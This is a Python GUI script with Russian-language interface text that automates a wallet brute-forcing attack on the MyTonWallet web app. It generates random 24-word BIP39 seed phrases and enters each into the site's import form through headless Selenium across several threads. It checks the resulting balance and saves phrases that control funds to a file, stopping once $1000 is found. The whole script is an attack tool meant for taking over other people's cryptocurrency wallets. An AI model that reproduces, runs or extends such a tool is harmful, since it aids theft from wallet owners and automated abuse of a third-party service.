import tkinter as tk
from tkinter import simpledialog, messagebox
import threading
import logging
from mnemonic import Mnemonic
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

# Настройка логирования
logging.basicConfig(
    filename='program.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

max_threads = 2  # Изначальное количество потоков
good_phrases_count = 0
bad_phrases_count = 0
balance_phrases_count = 0  # Переменная для хранения количества фраз с балансом
total_balance = 0.0  # Переменная для хранения общего баланса
balance_threshold = 1000.0  # Порог завершения работы программы

def generate_bip39_phrases(count=24, language='english'):
    mnemo = Mnemonic(language)
    phrase = mnemo.generate(strength=256)  # Генерация фразы из 24 слов
    return phrase.split()

def save_successful_phrase(phrase, filename):
    with open(filename, "a") as f:
        f.write(f"{' '.join(phrase)}\n")
    logging.info(f"Фраза '{' '.join(phrase)}' сохранена в {filename}.")

def fill_phrases_in_browser(driver, phrases, attempt_number):
    wait = WebDriverWait(driver, 30)
    for i, word in enumerate(phrases):
        word_input = wait.until(EC.presence_of_element_located(
            (By.ID, f'import-mnemonic-{i}')))
        word_input.send_keys(word)
        time.sleep(0.5)
    logging.info(f"Попытка #{attempt_number}: Мнемоническая фраза введена.")

def check_balance(driver):
    try:
        balance_element = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'balance')]"))
        )
        balance_text = balance_element.text
        balance = float(balance_text.replace('$', '').replace(',', '').strip())
        return balance
    except Exception as e:
        logging.error(f"Ошибка при проверке баланса: {e}")
        return 0.0

def perform_additional_steps(driver, attempt_number, log_queue):
    try:
        password_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), 'Использовать пароль')]"))
        )
        password_button.click()
        log_queue.put(f"Попытка #{attempt_number}: Нажата кнопка 'Использовать пароль'.")
        time.sleep(2)

        password_fields = WebDriverWait(driver, 30).until(
            EC.presence_of_all_elements_located((By.XPATH, "//input[@type='password']"))
        )
        password = "TestPassword123!"  # Замените на ваш пароль
        for field in password_fields:
            field.send_keys(password)
            time.sleep(1)
        continue_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Продолжить')]"))
        )
        continue_button.click()
        log_queue.put(f"Попытка #{attempt_number}: Пароль введен и нажата кнопка 'Продолжить'.")
        time.sleep(2)

        checkbox = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@type='checkbox']"))
        )
        checkbox.click()
        log_queue.put(f"Попытка #{attempt_number}: Установлена галочка принятия условий.")
        time.sleep(1)

        accept_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Продолжить')]"))
        )
        accept_button.click()
        log_queue.put(f"Попытка #{attempt_number}: Нажата кнопка 'Продолжить' после принятия условий.")
        time.sleep(2)

    except Exception as e:
        log_queue.put(f"Ошибка при выполнении дополнительных шагов: {e}")
        logging.error(f"Ошибка при выполнении дополнительных шагов: {e}")

def process_wallet(attempt_number, log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var):
    global good_phrases_count, bad_phrases_count, balance_phrases_count, total_balance, running
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--headless')
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    try:
        while running:
            driver.get("https://mytonwallet.app/")
            log_queue.put(f"Попытка #{attempt_number}: Перешли на страницу MyTonWallet.")
            time.sleep(5)

            wait = WebDriverWait(driver, 30)
            mnemonic_option = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//button[contains(text(), '24 секретных слова')]")))
            mnemonic_option.click()
            log_queue.put(f"Попытка #{attempt_number}: Выбрали опцию '24 секретных слова'.")
            time.sleep(3)

            phrases = generate_bip39_phrases()
            fill_phrases_in_browser(driver, phrases, attempt_number)

            continue_button = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//button[contains(text(), 'Продолжить')]")))
            continue_button.click()
            log_queue.put(f"Попытка #{attempt_number}: Нажали кнопку 'Продолжить'.")
            time.sleep(5)

            error_message = "Your mnemonic words are invalid"
            if error_message in driver.page_source:
                log_queue.put(f"Попытка #{attempt_number}: Мнемоническая фраза неверная. Попытка снова.")
                bad_phrases_count += 1
                bad_phrases_var.set(f"Плохих фраз: {bad_phrases_count}")
                driver.get("https://mytonwallet.app/")
                driver.delete_all_cookies()
                time.sleep(5)
                continue

            perform_additional_steps(driver, attempt_number, log_queue)

            balance = check_balance(driver)
            good_phrases_count += 1
            good_phrases_var.set(f"Хороших фраз: {good_phrases_count}")

            if balance > 0:
                total_balance += balance
                total_balance_var.set(f"Общий баланс: ${total_balance:.2f}")
                balance_phrases_count += 1
                balance_phrases_var.set(f"Фраз с балансом: {balance_phrases_count}")

                if balance >= balance_threshold:
                    log_queue.put(f"Попытка #{attempt_number}: Найден баланс ${balance}. Превышен порог, остановка.")
                    save_successful_phrase(phrases, "Over0.txt")
                    running = False
                    break
                else:
                    save_successful_phrase(phrases, "Over0.txt")
                    log_queue.put(f"Попытка #{attempt_number}: Найдена фраза с балансом ${balance}. Сохранена в Over0.txt.")
            else:
                save_successful_phrase(phrases, "zero.txt")
                log_queue.put(f"Попытка #{attempt_number}: Найдена фраза с нулевым балансом. Сохранена в zero.txt.")
                bad_phrases_count += 1
                bad_phrases_var.set(f"Плохих фраз: {bad_phrases_count}")

            driver.get("https://mytonwallet.app/")
            driver.delete_all_cookies()
            time.sleep(5)

    except Exception as e:
        log_queue.put(f"Попытка #{attempt_number}: Произошла ошибка: {e}")

    finally:
        driver.quit()

def start_process(log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var):
    global max_threads, running
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        attempt_counter = 0
        for i in range(max_threads):
            attempt_counter += 1
            futures.append(
                executor.submit(process_wallet, attempt_counter, log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var))
            log_queue.put(f"Запущено потоков: {len(futures)}")

        for future in as_completed(futures):
            log_queue.put(f"Поток завершен с результатом: {future.result()}")
        log_queue.put("Все потоки завершены.")

def open_settings_window():
    global max_threads
    new_value = simpledialog.askinteger("Настройки", "Введите количество потоков (1-10):", minvalue=1, maxvalue=10)
    if new_value:
        max_threads = new_value
        messagebox.showinfo("Настройки", f"Количество потоков изменено на {max_threads}.")

def process_log(log_text, log_queue):
    while True:
        log_message = log_queue.get()
        log_text.insert(tk.END, log_message + "\n")
        log_text.see(tk.END)

def toggle_process(start_button, log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var):
    global running, log_thread
    if running:
        running = False
        start_button.config(text="Запустить процесс")
    else:
        running = True
        start_button.config(text="Остановить процесс")
        log_queue.put("Процесс запущен.")
        log_thread = threading.Thread(target=start_process, args=(log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var))
        log_thread.start()

def create_gui():
    global running
    running = False

    root = tk.Tk()
    root.title("VOL | TONWALLET v.0.1")

    frame = tk.Frame(root)
    frame.pack(padx=10, pady=10)

    log_text = tk.Text(frame, height=20, width=50)
    log_text.pack(side=tk.TOP)

    log_queue = queue.Queue()
    log_thread = threading.Thread(target=process_log, args=(log_text, log_queue))
    log_thread.daemon = True
    log_thread.start()

    good_phrases_var = tk.StringVar(value="Хороших фраз: 0")
    bad_phrases_var = tk.StringVar(value="Плохих фраз: 0")
    balance_phrases_var = tk.StringVar(value="Фраз с балансом: 0")
    total_balance_var = tk.StringVar(value="Общий баланс: $0.00")

    start_button = tk.Button(frame, text="Запустить процесс",
                             command=lambda: toggle_process(start_button, log_queue, good_phrases_var, bad_phrases_var, balance_phrases_var, total_balance_var))
    start_button.pack(side=tk.LEFT)

    settings_button = tk.Button(frame, text="Настройки", command=open_settings_window)
    settings_button.pack(side=tk.RIGHT)

    good_phrases_label = tk.Label(root, textvariable=good_phrases_var)
    good_phrases_label.pack(side=tk.LEFT, padx=(10, 5))

    bad_phrases_label = tk.Label(root, textvariable=bad_phrases_var)
    bad_phrases_label.pack(side=tk.LEFT, padx=(5, 10))

    balance_phrases_label = tk.Label(root, textvariable=balance_phrases_var)
    balance_phrases_label.pack(side=tk.LEFT, padx=(5, 10))

    total_balance_label = tk.Label(root, textvariable=total_balance_var)
    total_balance_label.pack(side=tk.RIGHT, padx=(5, 10))

    root.mainloop()

if __name__ == "__main__":
    create_gui()